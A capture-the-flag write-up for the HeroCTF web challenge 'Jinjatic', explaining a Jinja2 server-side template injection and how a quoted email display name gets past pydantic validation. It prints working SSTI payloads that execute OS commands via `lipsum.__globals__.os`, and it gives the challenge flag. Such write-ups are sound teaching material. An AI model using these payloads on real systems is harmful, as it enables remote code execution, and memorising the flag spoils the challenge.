# Jinjatic

### Category

Web

### Description

A platform that allows users to render welcome email's template for a given customer, sounds great no ?

> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**<br>
Author : **Worty**

### Write Up

The platform is using jinja2 to render email templates that is vulnerable to SSTI :

```py
return Template(email_template%(email)).render()
```

So we can inject payloads like `test+{{7*7}}@heroctf.fr`

But, as the email is verified by pydantic, and that double quotes are disables by default, we canno't use payloads like : `test+{{lipsum.__globals__.os.system('id')}}@heroctf.fr`

If we read the pydantic source code, we see that it is using the module `email-validator` that is fully compliant with the email RFC.
With this in mind, email may have two shapes :

```
worty@heroctf.fr
"Worty" <worty@heroctf.fr>
```

So, for pydantic, everything under the double quotes in the second shape is considered valid !

The payload to get the flag is :

```
"Worty test+{{lipsum.__globals__.os.popen('/getflag').read()}}@heroctf.fr" <worty@heroctf.fr>
```
### Flag

HERO{f815460cee723a7d1ba1f0a70f68482c}
